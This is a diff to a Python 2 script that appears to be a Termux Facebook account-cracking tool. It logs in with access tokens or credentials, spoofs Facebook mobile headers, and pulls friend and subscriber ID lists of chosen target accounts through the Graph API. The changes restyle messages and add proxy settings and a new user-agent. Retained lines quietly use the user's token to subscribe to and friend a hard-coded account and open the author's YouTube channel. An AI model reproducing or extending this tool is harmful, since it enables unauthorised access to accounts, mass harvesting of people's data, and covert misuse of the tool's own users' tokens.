@@ -39,8 +39,13 @@ elif os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/b
     time.sleep(10)
 bd = random.randint(20000000.0, 30000000.0)
 sim = random.randint(20000.0, 40000.0)
-header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 reload(sys)
+
+http_proxy  = "http://10.10.1.10:3128"
+https_proxy = "https://10.10.1.11:1080"
+
+
 sys.setdefaultencoding('utf-8')
 c = '\x1b[1;32m'
 c2 = '\x1b[0;97m'
@@ -135,15 +140,15 @@ def pilih_memek():
             name = q['name']
             nm = name.rsplit(' ')[0]
             print ''
-            print '\t\x1b[1;37m Token logged in as \x1b[1;31m: \x1b[1;32m' + nm + '\x1b[0;97m'
+            print '\n\x1b[1;37m [\x1b[1;32m✓\x1b[1;37m] Login Successful'
             requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token='+token)
             time.sleep(3)
             os.system('xgd-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
             kanjut()
         except (KeyError, IOError):
-            print '\t \x1b[1;37m[\x1b[1;31m!\x1b[1;37m] Token Invalid'
+            print '\n \x1b[1;37m[\x1b[1;31m!\x1b[1;37m] Token Invalid'
             os.system('xdg-open https://youtu.be/xc06cplt3FU')
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             memek()
 
     elif yan =='2' or yan =='02':
@@ -176,11 +181,11 @@ def login_fb():
         yayan.close()
         requests.post('https://graph.facebook.com/me/friends?uid=100005395413800&access_token=' + q['loc'])
         time.sleep(1)
-        print '\t    \x1b[1;32mLogged in successfully\x1b[0;97m'
+        print '\n\x1b[1;37m [\x1b[1;32m✓\x1b[1;37m] Login Successful'
         time.sleep(1)
         kanjut()
     elif 'www.facebook.com' in q['error']:
-        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
+        print '\x1b[1;37m [\x1b[1;31m!\x1b[1;37m] User must verify account before login'
         print ''
         time.sleep(1)
         raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
@@ -218,10 +223,7 @@ def yxz():
     except requests.exceptions.ConnectionError:
         print logo
         print ''
-        print '\t    \x1b[1;31mTurn on mobile data OR wifi \x1b[0;97m'
-        print ''
-        time.sleep(1)
-        raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+        print '\n\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Turn on mobile data OR wifi'
         exit()
 
     os.system('clear')
@@ -257,9 +259,9 @@ def pilih_syngg():
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except (KeyError, IOError):
             print ''
-            print '\n\t     \x1b[1;91mWrong Id/User'
+            print '\n \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Wrong Id/User'
             print ''
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             yxz()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -293,9 +295,9 @@ def pilih_syngg():
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except (KeyError, IOError):
             print ''
-            print '\n\t     \x1b[1;91mWrong Id/User'
+            print '\n \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Wrong Id/User'
             print ''
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             yxz()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
@@ -521,7 +523,7 @@ def pilih_asu():
             print ''
             print '\x1b[1;31mID Not Found' + c2
             print ''
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             yayan_xd()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
@@ -545,7 +547,7 @@ def pilih_asu():
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except KeyError:
             print '\t    \x1b[1;31mID Not Found\x1b[0;97m'
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             yayan_xd()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
@@ -724,7 +726,7 @@ def pilih_kontol():
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except (KeyError, IOError):
             print '\n\n\t \x1b[1;37m[\x1b[1;33m!\x1b[1;37m] \x1b[1;91mWrong Id/User'
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             moch_yayan()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -758,7 +760,7 @@ def pilih_kontol():
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except (KeyError, IOError):
             print '\n\n\t \x1b[1;37m[\x1b[1;33m!\x1b[1;37m] \x1b[1;91mWrong Id/User'
-            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            raw_input('\n\x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             moch_yayan()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
